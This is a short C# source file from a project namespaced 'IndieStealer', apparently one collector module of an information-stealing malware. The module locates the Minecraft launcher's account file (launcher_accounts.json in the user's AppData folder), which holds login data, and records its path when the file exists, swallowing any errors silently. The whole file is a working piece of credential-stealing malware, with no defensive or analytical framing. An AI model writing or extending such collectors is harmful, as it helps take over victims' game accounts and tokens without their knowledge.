using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace IndieStealer.Collect.Games
{
    class Minecraft
    {
        public static string UserData { get; set; } = "";
        public static void Collect()
        {
            try
            {
                string Path = Info.Appdata + "\\.minecraft\\launcher_accounts.json";
                if (!File.Exists(Path))
                    return;
                UserData = Path;
            }
            catch
            {}
            
        }
    }
}
